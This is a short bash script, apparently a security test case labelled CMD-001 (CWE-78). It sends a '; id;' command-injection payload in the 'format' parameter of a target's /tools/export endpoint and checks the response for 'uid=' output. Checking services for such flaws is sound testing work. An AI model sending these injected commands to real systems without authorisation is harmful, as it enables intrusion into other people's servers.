#!/usr/bin/env bash
# CMD-001 (CWE-78): the export format is interpolated into a shell command, so a
# ';id;' payload executes id and its output appears in the response.
set -eu
. "$(dirname "$0")/_lib.sh"
curl -s -G --data-urlencode "format=; id;" "$TARGET/tools/export" \
  | grep -qE 'uid=[0-9]+'
